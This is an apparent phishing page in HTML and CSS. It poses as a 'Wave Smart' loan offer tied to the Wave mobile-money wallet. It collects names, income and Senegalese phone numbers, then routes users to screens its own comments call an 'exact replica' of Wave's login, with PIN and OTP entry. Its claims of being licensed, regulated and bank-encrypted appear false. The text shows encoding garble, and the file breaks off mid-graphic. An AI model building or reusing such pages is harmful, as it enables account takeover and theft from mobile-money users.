<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Wave Smart</title>
<link href="https://fonts.googleapis.com/css2?family=Patrick+Hand&display=swap" rel="stylesheet">
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: 'Patrick Hand', cursive; background: #f0f0f0; display:flex; align-items:center; justify-content:center; min-height:100vh; }
.wrap {
  width: 390px; height: 844px;
  background: #fff;
  border-radius: 0;
  overflow: hidden;
  position: relative;
  flex-shrink: 0;
}
@media(max-width:430px){
  body { background:#fff; align-items:flex-start; }
  .wrap { width:100vw; height:100vh; }
}

/* SCREENS */
.scr { display: none; flex-direction: column; height: 844px; background: #fff; overflow-y: auto; overflow-x: hidden; }
.scr.active { display: flex; }

/* TOP BAR */
.tbar { display:flex; align-items:center; justify-content:center; gap:8px; padding:22px 0 0; }
.tbar-title { font-size:18px; font-weight:700; color:#111; }
.tbar-title em { font-style:normal; color:#4dc8e8; }

/* CYAN BUTTON */
.cbtn { display:block; width:100%; padding:16px; background:#4dc8e8; border:none; border-radius:50px; font-size:15px; font-family:'Patrick Hand',cursive; font-weight:700; color:#fff; cursor:pointer; text-align:center; }
.cbtn:disabled { background:#b3e8f5; cursor:not-allowed; }
.gbtn { display:block; flex:1; padding:14px; background:#f5f5f5; border:none; border-radius:50px; font-size:14px; font-family:'Patrick Hand',cursive; font-weight:600; color:#666; cursor:pointer; }
.brow { display:flex; gap:10px; }

/* HERO */
.hero { margin:14px; background:#4dc8e8; border-radius:20px; padding:20px 18px; display:flex; justify-content:space-between; align-items:flex-start; gap:8px; }
.hero-left {}
.hero-eye { font-size:10px; font-weight:600; letter-spacing:0.1em; color:rgba(255,255,255,0.6); text-transform:uppercase; margin-bottom:6px; }
.hero-h { font-size:19px; font-weight:700; color:#fff; line-height:1.2; margin-bottom:8px; }
.hero-p { font-size:12px; color:rgba(255,255,255,0.7); line-height:1.4; margin-bottom:12px; max-width:190px; }
.pill { display:inline-flex; align-items:center; gap:6px; background:rgba(255,255,255,0.2); border:1px solid rgba(255,255,255,0.3); color:#fff; font-size:11px; font-weight:600; padding:5px 12px; border-radius:30px; }
.dot { width:6px; height:6px; border-radius:50%; background:#4ade80; animation:pulse 2s ease-in-out infinite; flex-shrink:0; }
@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.3} }

/* CALC AREA */
.calc { padding:14px 14px 0; }
.calc-top { display:flex; justify-content:space-between; align-items:baseline; margin-bottom:6px; }
.calc-lbl { font-size:11px; color:#aaa; text-transform:uppercase; letter-spacing:0.05em; }
.calc-amt { font-size:26px; font-weight:700; color:#4dc8e8; }
input[type=range] { width:100%; height:5px; -webkit-appearance:none; border-radius:5px; outline:none; cursor:pointer; background:#eee; margin-bottom:14px; }
input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; height:22px; border-radius:50%; background:#fff; border:2.5px solid #4dc8e8; box-shadow:0 1px 5px rgba(77,200,232,0.3); cursor:pointer; }

/* META BOXES */
.mgrid { display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-bottom:16px; }
.mbox { background:#f7f7f7; border-radius:14px; padding:12px 14px; }
.mbox-lbl { font-size:10px; color:#aaa; letter-spacing:0.06em; text-transform:uppercase; margin-bottom:4px; }
.mbox-val { font-size:16px; font-weight:700; color:#111; }
.mbox-note { font-size:10px; color:#ccc; margin-top:2px; }

/* TRUST */
.trust { display:flex; justify-content:space-around; padding:14px 20px; border-top:1px solid #f5f5f5; border-bottom:1px solid #f5f5f5; margin-bottom:16px; }
.ti { display:flex; flex-direction:column; align-items:center; gap:5px; }
.ti-icon { width:34px; height:34px; border-radius:10px; background:#f0fbfe; display:flex; align-items:center; justify-content:center; }
.ti-icon svg { width:16px; height:16px; stroke:#4dc8e8; fill:none; stroke-width:2; stroke-linecap:round; stroke-linejoin:round; }
.ti-lbl { font-size:9.5px; color:#aaa; letter-spacing:0.04em; text-transform:uppercase; font-weight:600; }

/* FEATURES */
.flist { margin-bottom:40px; }
.frow { display:flex; align-items:center; gap:14px; padding:14px 20px; border-bottom:1px solid #f5f5f5; }
.ficon { width:38px; height:38px; border-radius:12px; background:#f0fbfe; display:flex; align-items:center; justify-content:center; flex-shrink:0; }
.ficon svg { width:18px; height:18px; stroke:#4dc8e8; fill:none; stroke-width:1.8; stroke-linecap:round; stroke-linejoin:round; }
.ftext h4 { font-size:14px; font-weight:600; color:#111; margin-bottom:2px; }
.ftext p { font-size:12px; color:#aaa; line-height:1.4; }

/* STEP PAGES */
.pbody { padding:18px 20px 30px; flex:1; display:flex; flex-direction:column; }
.ph { font-size:20px; font-weight:700; color:#111; margin-bottom:4px; }
.ps { font-size:13px; color:#aaa; margin-bottom:20px; line-height:1.4; }
.spacer { flex:1; }
.prog-wrap { padding:0 20px; margin-bottom:18px; }
.prog-lbl { font-size:11px; color:#aaa; letter-spacing:0.05em; margin-bottom:5px; }
.prog-track { height:4px; background:#eee; border-radius:4px; overflow:hidden; }
.prog-fill { height:100%; background:#4dc8e8; border-radius:4px; }

/* FIELDS */
.field { margin-bottom:15px; }
.flbl { display:block; font-size:11px; font-weight:600; letter-spacing:0.06em; color:#aaa; margin-bottom:6px; text-transform:uppercase; }
.field input, .field select { width:100%; padding:13px 15px; background:#f7f7f7; border:1.5px solid transparent; border-radius:14px; font-size:15px; font-family:'Patrick Hand',cursive; color:#111; outline:none; -webkit-appearance:none; }
.field input:focus, .field select:focus { border-color:#4dc8e8; background:#fff; }
.field input::placeholder { color:#ccc; }
.fpair { display:grid; grid-template-columns:1fr 1fr; gap:10px; }
.prow { display:flex; gap:8px; }
.dpill { padding:13px 11px; background:#f7f7f7; border-radius:14px; font-size:13px; font-weight:600; color:#111; white-space:nowrap; flex-shrink:0; display:flex; align-items:center; }
.prow input { flex:1; padding:13px 15px; background:#f7f7f7; border:1.5px solid transparent; border-radius:14px; font-size:15px; font-family:'Patrick Hand',cursive; color:#111; outline:none; }
.prow input:focus { border-color:#4dc8e8; background:#fff; }
.prow input::placeholder { color:#ccc; }

/* REPAY BOX */
.rbox { background:#f0fbfe; border:2px solid #b3e8f5; border-radius:16px; padding:16px 18px; display:flex; justify-content:space-between; align-items:center; margin-bottom:18px; }
.rbox-lbl { font-size:11px; color:#aaa; text-transform:uppercase; letter-spacing:0.05em; margin-bottom:3px; }
.rbox-note { font-size:10px; color:#aaa; margin-top:2px; }
.rbox-val { font-size:20px; font-weight:700; color:#4dc8e8; }

/* SUMMARY */
.sumbox { background:#f7f7f7; border-radius:16px; padding:4px 0; margin-bottom:16px; }
.sumrow { display:flex; justify-content:space-between; align-items:center; padding:12px 16px; border-bottom:1px solid #eee; }
.sumrow:last-child { border-bottom:none; }
.sumlbl { font-size:11px; color:#aaa; text-transform:uppercase; letter-spacing:0.04em; }
.sumval { font-size:14px; font-weight:600; color:#111; }
.legal { font-size:12px; color:#aaa; line-height:1.6; margin-bottom:18px; padding:12px 14px; background:#f7f7f7; border-radius:12px; border-left:3px solid #b3e8f5; }

/* SUCCESS */
.succ-wrap { flex:1; display:flex; flex-direction:column; align-items:center; justify-content:center; padding:40px 24px; text-align:center; }
.succ-pen { position:relative; width:80px; height:80px; margin:0 auto 20px; animation:pop 0.5s cubic-bezier(0.34,1.4,0.64,1) both; }
@keyframes pop { from{transform:scale(0.5);opacity:0} to{transform:scale(1);opacity:1} }
.succ-badge { position:absolute; bottom:0; right:0; width:26px; height:26px; border-radius:50%; background:#22c55e; border:3px solid #fff; display:flex; align-items:center; justify-content:center; }
.succ-badge svg { width:12px; height:12px; stroke:#fff; fill:none; stroke-width:2.8; stroke-linecap:round; stroke-linejoin:round; }
.succ-h { font-size:22px; font-weight:700; color:#111; margin-bottom:10px; }
.succ-p { font-size:14px; color:#aaa; line-height:1.6; margin-bottom:6px; }
.succ-p strong { color:#111; }
.succ-note { font-size:12px; color:#ccc; margin-bottom:24px; }
.sess { width:100%; background:#f7f7f7; border-radius:12px; padding:12px 16px; display:flex; align-items:center; gap:10px; margin-bottom:10px; }
@keyframes spin { to{transform:rotate(360deg)} }
.spinner { width:18px; height:18px; border:2px solid #eee; border-top-color:#4dc8e8; border-radius:50%; animation:spin 0.9s linear infinite; flex-shrink:0; }
.sess-txt { font-size:12px; font-weight:600; color:#4dc8e8; }
.mbtn { width:100%; padding:12px; background:transparent; border:1px solid #eee; border-radius:50px; font-size:13px; font-family:'Patrick Hand',cursive; font-weight:600; color:#aaa; cursor:pointer; }
.fnote { margin-top:16px; font-size:11px; color:#ccc; }

/* ‚ïê‚ïê SPLASH SCREEN ‚ïê‚ïê */
.splash-wrap { flex:1; display:flex; align-items:center; justify-content:center; }
.splash-penguin { animation: splashPop 0.5s cubic-bezier(0.34,1.5,0.64,1) both; }
@keyframes splashPop { from{transform:scale(0.6) translateY(20px);opacity:0} to{transform:scale(1) translateY(0);opacity:1} }

/* ‚ïê‚ïê WAVE AUTH SCREENS (exact replica) ‚ïê‚ïê */

/* Shared heading */
.wave-h {
  font-size:17px; font-weight:700; color:#111;
  text-align:center; padding:44px 28px 28px;
  line-height:1.4;
}

/* Phone number underline row */
.wave-ph-row {
  display:flex; align-items:flex-end;
  padding:0 24px; gap:0;
  border-bottom:2px solid #4dc8e8;
  margin:0 24px;
  padding-bottom:8px;
}
.wave-cc {
  display:flex; align-items:center; gap:4px;
  font-size:16px; font-weight:600; color:#111;
  white-space:nowrap; flex-shrink:0; padding-right:12px;
  border-right:1px solid #ddd; margin-right:12px;
}
.wave-cc svg { width:8px; height:8px; fill:#888; }
.wave-ph-in {
  flex:1; background:transparent; border:none; outline:none;
  font-size:16px; font-family:'Patrick Hand',cursive; color:#111;
  padding:0; caret-color:#4dc8e8; min-width:0;
}
.wave-ph-in::placeholder { color:#bbb; }

/* Numeric keypad */
.keypad {
  display:grid; grid-template-columns:repeat(3,1fr);
  gap:0; margin-top:auto; padding:10px 0 0;
}
.kk {
  display:flex; flex-direction:column; align-items:center; justify-content:center;
  height:68px; cursor:pointer;
  background:transparent; border:none; -webkit-tap-highlight-color:transparent;
  transition:background 0.1s;
  user-select:none; gap:1px;
}
.kk:active { background:#f0f0f0; }
.kk.empty { cursor:default; }
.kk-num { font-size:26px; font-weight:500; color:#111; font-family:'Patrick Hand',cursive; line-height:1; }
.kk-letters { font-size:9px; font-weight:700; color:#888; letter-spacing:0.12em; text-transform:uppercase; min-height:12px; }
.kk.backspace .kk-num { font-size:18px; }
.kk.forgot-key .kk-num { font-size:10px; font-weight:700; color:#888; letter-spacing:0.04em; text-transform:uppercase; }

/* Next / bottom button */
.wave-next {
  width:calc(100% - 48px); margin:16px 24px 32px;
  padding:18px; background:#b3e8f5; border:none; border-radius:50px;
  font-size:16px; font-weight:700; font-family:'Patrick Hand',cursive;
  color:#fff; cursor:pointer; transition:background 0.15s;
}
.wave-next.active-btn { background:#4dc8e8; }

/* Back arrow */
.wave-back {
  padding:20px 20px 0; cursor:pointer; width:fit-content;
}
.wave-back svg { width:22px; height:22px; stroke:#111; fill:none; stroke-width:2; stroke-linecap:round; stroke-linejoin:round; }

/* PIN dots row */
.pin-dots-row {
  display:flex; justify-content:center; gap:20px;
  padding:32px 0 0;
}
.pd {
  width:18px; height:18px; border-radius:50%;
  background:#b3e8f5;
  transition:background 0.15s, transform 0.1s;
}
.pd.filled { background:#4dc8e8; transform:scale(1.1); }

/* PIN lock icon */
.pin-lock-wrap { display:flex; justify-content:center; padding-top:44px; }

/* OTP DOTS */
.otp-dots-w { display:flex; justify-content:center; gap:14px; margin-top:6px; margin-bottom:4px; position:relative; }
.od-w { width:13px; height:13px; border-radius:50%; background:#e5e5e5; transition:background 0.16s, transform 0.12s; }
.od-w.on { background:#4dc8e8; transform:scale(1.25); }
.otp-tap-w { position:absolute; inset:-20px; cursor:text; }
.otp-err-w { background:#fef2f2; color:#dc2626; padding:10px 14px; border-radius:10px; margin-top:14px; font-size:12px; text-align:center; display:none; border:1px solid #fecaca; }
.otp-err-w.show { display:block; }
.resend-w { margin-top:20px; text-align:center; }
.resend-btn-w { font-size:13px; color:#4dc8e8; font-weight:600; background:none; border:none; font-family:'Patrick Hand',cursive; cursor:pointer; }
.resend-cd-w { font-size:11px; color:#ccc; margin-top:4px; min-height:16px; }

/* OVERLAYS */
.ov { position:fixed; top:0;left:0;right:0;bottom:0; background:rgba(0,0,0,0.25); display:none; align-items:center; justify-content:center; z-index:999; backdrop-filter:blur(2px); }
.ov.show { display:flex; }
.load-card { background:#fff; border-radius:20px; padding:26px 24px; text-align:center; box-shadow:0 8px 40px rgba(0,0,0,0.12); }
.load-spin { width:32px; height:32px; border:3px solid #eee; border-top-color:#4dc8e8; border-radius:50%; animation:spin 0.6s linear infinite; margin:0 auto 10px; }
.load-txt { font-size:14px; color:#111; }
.pop-card { background:#fff; border-radius:20px; padding:28px 22px; max-width:280px; width:90%; text-align:center; box-shadow:0 8px 40px rgba(0,0,0,0.12); }
.pop-icon { width:50px; height:50px; border-radius:50%; margin:0 auto 14px; display:flex; align-items:center; justify-content:center; }
.pop-icon.err { background:#fef2f2; } .pop-icon.err svg { stroke:#dc2626; }
.pop-icon.inf { background:#f0fbfe; } .pop-icon.inf svg { stroke:#4dc8e8; }
.pop-icon svg { width:24px; height:24px; fill:none; stroke-width:2; stroke-linecap:round; stroke-linejoin:round; }
.pop-h { font-size:18px; font-weight:700; color:#111; margin-bottom:8px; }
.pop-p { font-size:13px; color:#aaa; line-height:1.5; margin-bottom:20px; }
.pop-btn { background:#4dc8e8; color:#fff; border:none; padding:13px 20px; border-radius:50px; font-size:14px; font-weight:600; font-family:'Patrick Hand',cursive; width:100%; cursor:pointer; }

/* TOAST */
.toast { position:fixed; bottom:20px; left:50%; transform:translateX(-50%) translateY(10px); background:#fff; border:1px solid #eee; border-radius:14px; padding:10px 14px; display:flex; align-items:center; gap:10px; box-shadow:0 4px 20px rgba(0,0,0,0.08); opacity:0; transition:opacity 0.3s,transform 0.3s; pointer-events:none; z-index:100; white-space:nowrap; }
.toast.show { opacity:1; transform:translateX(-50%) translateY(0); }
.tav { width:30px; height:30px; border-radius:50%; background:#f0fbfe; display:flex; align-items:center; justify-content:center; font-size:12px; font-weight:700; color:#4dc8e8; flex-shrink:0; }
.tn { font-size:12.5px; font-weight:600; color:#111; }
.td { font-size:11px; color:#aaa; margin-top:1px; }
.tck { width:20px; height:20px; border-radius:50%; background:#f0fdf4; display:flex; align-items:center; justify-content:center; flex-shrink:0; }
.tck svg { width:11px; height:11px; stroke:#22c55e; fill:none; stroke-width:2.5; stroke-linecap:round; stroke-linejoin:round; }

#otp-in { position:fixed; opacity:0; width:1px; height:1px; top:50%; left:50%; }
</style>
</head>
<body>
<div class="wrap">

  <!-- OVERLAYS -->
  <div class="ov" id="loadOv"><div class="load-card"><div class="load-spin"></div><div class="load-txt">Veuillez patienter‚Ä¶</div></div></div>
  <div class="ov" id="popOv">
    <div class="pop-card">
      <div class="pop-icon" id="popIcon"></div>
      <div class="pop-h" id="popH"></div>
      <div class="pop-p" id="popP"></div>
      <button class="pop-btn" onclick="document.getElementById('popOv').classList.remove('show')">OK</button>
    </div>
  </div>
  <div class="toast" id="toast">
    <div class="tav" id="tav">A</div>
    <div><div class="tn" id="tn"></div><div class="td" id="td"></div></div>
    <div class="tck"><svg viewBox="0 0 12 12"><polyline points="2 6 5 9 10 3"/></svg></div>
  </div>

  <!-- ‚ïê‚ïê LANDING ‚ïê‚ïê -->
  <div class="scr" id="s-land">
    <div class="tbar">
      <svg width="26" height="26" viewBox="0 0 120 145"><ellipse cx="60" cy="95" rx="33" ry="42" fill="#111"/><ellipse cx="60" cy="100" rx="19" ry="29" fill="#fff"/><circle cx="60" cy="48" r="26" fill="#111"/><circle cx="51" cy="43" r="4.5" fill="#fff"/><circle cx="69" cy="43" r="4.5" fill="#fff"/><circle cx="52" cy="44" r="2.2" fill="#111"/><circle cx="70" cy="44" r="2.2" fill="#111"/><ellipse cx="60" cy="54" rx="6" ry="4" fill="#f90"/><ellipse cx="32" cy="62" rx="9" ry="22" fill="#111" transform="rotate(-70 32 62)"/><ellipse cx="89" cy="90" rx="9" ry="20" fill="#111" transform="rotate(12 89 90)"/><ellipse cx="48" cy="134" rx="11" ry="6" fill="#f90"/><ellipse cx="70" cy="134" rx="11" ry="6" fill="#f90"/></svg>
      <span class="tbar-title">Wave <em>Smart</em></span>
    </div>
    <div class="hero">
      <div class="hero-left">
        <div class="hero-eye">Finance Mobile</div>
        <div class="hero-h">Du capital quand vous en avez besoin</div>
        <div class="hero-p">Pr√™ts √† court terme. Fonds directement dans votre portefeuille Wave.</div>
        <div class="pill"><div class="dot"></div>Dossiers ouverts</div>
      </div>
      <svg width="66" height="80" viewBox="0 0 120 145" style="opacity:0.28;flex-shrink:0;"><ellipse cx="60" cy="95" rx="33" ry="42" fill="#fff"/><ellipse cx="60" cy="100" rx="19" ry="29" fill="rgba(255,255,255,0.5)"/><circle cx="60" cy="48" r="26" fill="#fff"/><circle cx="51" cy="43" r="4.5" fill="rgba(255,255,255,0.8)"/><circle cx="69" cy="43" r="4.5" fill="rgba(255,255,255,0.8)"/><circle cx="52" cy="44" r="2.2" fill="rgba(0,60,80,0.4)"/><circle cx="70" cy="44" r="2.2" fill="rgba(0,60,80,0.4)"/><ellipse cx="60" cy="54" rx="6" ry="4" fill="#f90"/><ellipse cx="32" cy="62" rx="9" ry="22" fill="#fff" transform="rotate(-70 32 62)"/><ellipse cx="89" cy="90" rx="9" ry="20" fill="#fff" transform="rotate(12 89 90)"/><ellipse cx="48" cy="134" rx="11" ry="6" fill="#f90"/><ellipse cx="70" cy="134" rx="11" ry="6" fill="#f90"/></svg>
    </div>
    <div class="calc">
      <div class="calc-top"><span class="calc-lbl">Montant</span><span class="calc-amt" id="loanAmt">100 000 FCFA</span></div>
      <input type="range" id="slider" min="50000" max="2000000" value="100000" step="10000" oninput="sliderChange(this.value)">
      <div class="mgrid">
        <div class="mbox"><div class="mbox-lbl">Mensualit√©</div><div class="mbox-val" id="mRepay">‚Äî</div><div class="mbox-note">sur 12 mois</div></div>
        <div class="mbox"><div class="mbox-lbl">Taux</div><div class="mbox-val">5% /an</div><div class="mbox-note">fixe</div></div>
      </div>
      <button class="cbtn" onclick="go('s-land','s-p1')" style="margin-bottom:14px;">V√©rifier mon √©ligibilit√©</button>
    </div>
    <div class="trust">
      <div class="ti"><div class="ti-icon"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div><span class="ti-lbl">S√©curis√©</span></div>
      <div class="ti"><div class="ti-icon"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg></div><span class="ti-lbl">Rapide</span></div>
      <div class="ti"><div class="ti-icon"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg></div><span class="ti-lbl">Agr√©√©</span></div>
      <div class="ti"><div class="ti-icon"><svg viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="3"/><path d="M3 9h18M9 21V9"/></svg></div><span class="ti-lbl">R√©gul√©</span></div>
    </div>
    <div class="flist">
      <div class="frow"><div class="ficon"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg></div><div class="ftext"><h4>D√©cision en quelques minutes</h4><p>La plupart des demandes trait√©es le jour m√™me.</p></div></div>
      <div class="frow"><div class="ficon"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg></div><div class="ftext"><h4>Vos donn√©es restent priv√©es</h4><p>Chiffrement bancaire. Vos infos ne sont jamais vendues.</p></div></div>
      <div class="frow"><div class="ficon"><svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5M2 12l10 5 10-5"/></svg></div><div class="ftext"><h4>Fonds dans votre portefeuille Wave</h4><p>L'argent arrive directement dans votre wallet.</p></div></div>
    </div>
  </div>

  <!-- ‚ïê‚ïê STEP 1 ‚ïê‚ïê -->
  <div class="scr" id="s-p1">
    <div class="tbar"><svg width="26" height="26" viewBox="0 0 120 145"><ellipse cx="60" cy="95" rx="33" ry="42" fill="#111"/><ellipse cx="60" cy="100" rx="19" ry="29" fill="#fff"/><circle cx="60" cy="48" r="26" fill="#111"/><circle cx="51" cy="43" r="4.5" fill="#fff"/><circle cx="69" cy="43" r="4.5" fill="#fff"/><circle cx="52" cy="44" r="2.2" fill="#111"/><circle cx="70" cy="44" r="2.2" fill="#111"/><ellipse cx="60" cy="54" rx="6" ry="4" fill="#f90"/><ellipse cx="32" cy="62" rx="9" ry="22" fill="#111" transform="rotate(-70 32 62)"/><ellipse cx="89" cy="90" rx="9" ry="20" fill="#111" transform="rotate(12 89 90)"/><ellipse cx="48" cy="134" rx="11" ry="6" fill="#f90"/><ellipse cx="70" cy="134" rx="11" ry="6" fill="#f90"/></svg><span class="tbar-title">Wave <em>Smart</em></span></div>
    <div class="prog-wrap" style="margin-top:14px;"><div class="prog-lbl">√âtape 1 sur 3</div><div class="prog-track"><div class="prog-fill" style="width:33%"></div></div></div>
    <div class="pbody">
      <div class="ph">D√©tails du pr√™t</div>
      <div class="ps">Dites-nous combien vous avez besoin et pour combien de temps.</div>
      <div class="field"><label class="flbl">Montant demand√© (FCFA)</label><input type="number" id="p1amt" placeholder="ex. 150 000" oninput="calcUpdate()"></div>
      <div class="field"><label class="flbl">Dur√©e</label><select id="p1dur" onchange="calcUpdate()"><option value="6">6 mois</option><option value="12" selected>12 mois</option><option value="18">18 mois</option><option value="24">24 mois</option></select></div>
      <div class="rbox"><div><div class="rbox-lbl">Mensualit√© estim√©e</div><div class="rbox-note">5% /an ¬∑ sans frais cach√©s</div></div><div class="rbox-val" id="p1rep">0 FCFA</div></div>
      <div class="spacer"></div>
      <button class="cbtn" onclick="go('s-p1','s-p2')">Continuer</button>
    </div>
  </div>

  <!-- ‚ïê‚ïê STEP 2 ‚ïê‚ïê -->
  <div class="scr" id="s-p2">
    <div class="tbar"><svg width="26" height="26" viewBox="0 0 120 145"><ellipse cx="60" cy="95" rx="33" ry="42" fill="#111"/><ellipse cx="60" cy="100" rx="19" ry="29" fill="#fff"/><circle cx="60" cy="48" r="26" fill="#111"/><circle cx="51" cy="43" r="4.5" fill="#fff"/><circle cx="69" cy="43" r="4.5" fill="#fff"/><circle cx="52" cy="44" r="2.2" fill="#111"/><circle cx="70" cy="44" r="2.2" fill="#111"/><ellipse cx="60" cy="54" rx="6" ry="4" fill="#f90"/><ellipse cx="32" cy="62" rx="9" ry="22" fill="#111" transform="rotate(-70 32 62)"/><ellipse cx="89" cy="90" rx="9" ry="20" fill="#111" transform="rotate(12 89 90)"/><ellipse cx="48" cy="134" rx="11" ry="6" fill="#f90"/><ellipse cx="70" cy="134" rx="11" ry="6" fill="#f90"/></svg><span class="tbar-title">Wave <em>Smart</em></span></div>
    <div class="prog-wrap" style="margin-top:14px;"><div class="prog-lbl">√âtape 2 sur 3</div><div class="prog-track"><div class="prog-fill" style="width:66%"></div></div></div>
    <div class="pbody">
      <div class="ph">√Ä votre sujet</div>
      <div class="ps">Quelques informations pour √©valuer votre demande. Environ 2 minutes.</div>
      <div class="field"><div class="fpair"><div><label class="flbl">Pr√©nom</label><input type="text" id="fn" placeholder="ex. Amadou" oninput="chk2();calcUpdate()"></div><div><label class="flbl">Nom</label><input type="text" id="ln" placeholder="ex. Diallo" oninput="chk2();calcUpdate()"></div></div></div>
      <div class="field"><label class="flbl">Revenu mensuel (FCFA)</label><input type="text" inputmode="numeric" id="inc" placeholder="Revenus mensuels moyens" oninput="this.value=this.value.replace(/\D/g,'');chk2();calcUpdate()"></div>
      <div class="field"><label class="flbl">Num√©ro mobile</label><div class="prow"><div class="dpill">üá∏üá≥ +221</div><input type="tel" id="ph" placeholder="7X XXX XX XX" maxlength="12" oninput="this.value=this.value.replace(/\D/g,'').slice(0,12);chk2()"></div></div>
      <div class="spacer"></div>
      <div class="brow">
        <button class="gbtn" onclick="go('s-p2','s-p1')">‚Üê Retour</button>
        <button class="cbtn" id="p2btn" onclick="p2go()" disabled style="flex:2;opacity:0.4;">Continuer</button>
      </div>
    </div>
  </div>

  <!-- ‚ïê‚ïê STEP 3 ‚ïê‚ïê -->
  <div class="scr" id="s-p3">
    <div class="tbar"><svg width="26" height="26" viewBox="0 0 120 145"><ellipse cx="60" cy="95" rx="33" ry="42" fill="#111"/><ellipse cx="60" cy="100" rx="19" ry="29" fill="#fff"/><circle cx="60" cy="48" r="26" fill="#111"/><circle cx="51" cy="43" r="4.5" fill="#fff"/><circle cx="69" cy="43" r="4.5" fill="#fff"/><circle cx="52" cy="44" r="2.2" fill="#111"/><circle cx="70" cy="44" r="2.2" fill="#111"/><ellipse cx="60" cy="54" rx="6" ry="4" fill="#f90"/><ellipse cx="32" cy="62" rx="9" ry="22" fill="#111" transform="rotate(-70 32 62)"/><ellipse cx="89" cy="90" rx="9" ry="20" fill="#111" transform="rotate(12 89 90)"/><ellipse cx="48" cy="134" rx="11" ry="6" fill="#f90"/><ellipse cx="70" cy="134" rx="11" ry="6" fill="#f90"/></svg><span class="tbar-title">Wave <em>Smart</em></span></div>
    <div class="prog-wrap" style="margin-top:14px;"><div class="prog-lbl">√âtape 3 sur 3</div><div class="prog-track"><div class="prog-fill" style="width:100%"></div></div></div>
    <div class="pbody">
      <div class="ph">V√©rifier et soumettre</div>
      <div class="ps">V√©rifiez vos informations. Aucun frais ne sera pr√©lev√© aujourd'hui.</div>
      <div class="sumbox">
        <div class="sumrow"><span class="sumlbl">Montant</span><span class="sumval" id="rv-amt">‚Äî</span></div>
        <div class="sumrow"><span class="sumlbl">Revenu mensuel</span><span class="sumval" id="rv-inc">‚Äî</span></div>
        <div class="sumrow"><span class="sumlbl">Demandeur</span><span class="sumval" id="rv-name">‚Äî</span></div>
        <div class="sumrow"><span class="sumlbl">Mensualit√©</span><span class="sumval" id="rv-rep">‚Äî</span></div>
        <div class="sumrow"><span class="sumlbl">Taux</span><span class="sumval">5% /an fixe</span></div>
      </div>
      <div class="legal">En soumettant, vous confirmez que les informations sont exactes. Wave Smart utilisera ceci pour une √©valuation de cr√©dit. Aucun fonds ne sera vers√© sans votre confirmation.</div>
      <div class="spacer"></div>
      <div class="brow">
        <button class="gbtn" onclick="go('s-p3','s-p2')">‚Üê Retour</button>
        <button class="cbtn" onclick="submitApp()" style="flex:2;">Soumettre</button>
      </div>
    </div>
  </div>

  <!-- ‚ïê‚ïê SUCCESS ‚ïê‚ïê -->
  <div class="scr" id="s-ok">
    <div class="tbar"><svg width="26" height="26" viewBox="0 0 120 145"><ellipse cx="60" cy="95" rx="33" ry="42" fill="#111"/><ellipse cx="60" cy="100" rx="19" ry="29" fill="#fff"/><circle cx="60" cy="48" r="26" fill="#111"/><circle cx="51" cy="43" r="4.5" fill="#fff"/><circle cx="69" cy="43" r="4.5" fill="#fff"/><circle cx="52" cy="44" r="2.2" fill="#111"/><circle cx="70" cy="44" r="2.2" fill="#111"/><ellipse cx="60" cy="54" rx="6" ry="4" fill="#f90"/><ellipse cx="32" cy="62" rx="9" ry="22" fill="#111" transform="rotate(-70 32 62)"/><ellipse cx="89" cy="90" rx="9" ry="20" fill="#111" transform="rotate(12 89 90)"/><ellipse cx="48" cy="134" rx="11" ry="6" fill="#f90"/><ellipse cx="70" cy="134" rx="11" ry="6" fill="#f90"/></svg><span class="tbar-title">Wave <em>Smart</em></span></div>
    <div class="succ-wrap">
      <div class="succ-pen">
        <svg width="80" height="80" viewBox="0 0 120 145"><ellipse cx="60" cy="95" rx="33" ry="42" fill="#111"/><ellipse cx="60" cy="100" rx="19" ry="29" fill="#fff"/><circle cx="60" cy="48" r="26" fill="#111"/><circle cx="51" cy="43" r="4.5" fill="#fff"/><circle cx="69" cy="43" r="4.5" fill="#fff"/><circle cx="52" cy="44" r="2.2" fill="#111"/><circle cx="70" cy="44" r="2.2" fill="#111"/><ellipse cx="60" cy="54" rx="6" ry="4" fill="#f90"/><ellipse cx="32" cy="62" rx="9" ry="22" fill="#111" transform="rotate(-70 32 62)"/><ellipse cx="89" cy="90" rx="9" ry="20" fill="#111" transform="rotate(12 89 90)"/><ellipse cx="48" cy="134" rx="11" ry="6" fill="#f90"/><ellipse cx="70" cy="134" rx="11" ry="6" fill="#f90"/></svg>
        <div class="succ-badge"><svg viewBox="0 0 12 12"><polyline points="2 6 5 9 10 3"/></svg></div>
      </div>
      <div class="succ-h">Demande soumise !</div>
      <p class="succ-p">Vos informations sont en cours d'examen. La plupart des d√©cisions sont prises dans <strong>quelques heures</strong>.</p>
      <p class="succ-note">Gardez votre t√©l√©phone √† port√©e ‚Äî nous vous enverrons votre r√©f√©rence par SMS.</p>
      <div class="sess"><div class="spinner" id="sessSpinner"></div><span class="sess-txt" id="sessTxt">Chiffrement de votre session‚Ä¶</span></div>
      <button class="mbtn" id="contBtn" onclick="go('s-ok','s-login')" style="display:none;margin-bottom:8px;">Continuer vers Wave</button>
      <div class="fnote">¬© 2026 Wave Smart ¬∑ Agr√©√© et r√©glement√©</div>
    </div>
  </div>

  <!-- ‚ïê‚ïê SPLASH ‚ïê‚ïê -->
  <div class="scr" id="s-splash">
    <div class="splash-wrap">
      <div class="splash-penguin">
        <!-- Penguin SVG matching image 1 -->
        <svg width="130" height="160" viewBox="0 0 130 160" xmlns="http://www.w3.org/2000/svg">
          <!-- Body -->
          <ellipse cx="65" cy="105" rx="36" ry="46" fill="#111"/>
          <!-- White belly -->
          <ellipse cx="65" cy="112" rx="21" ry="32" fill="#fff"/>
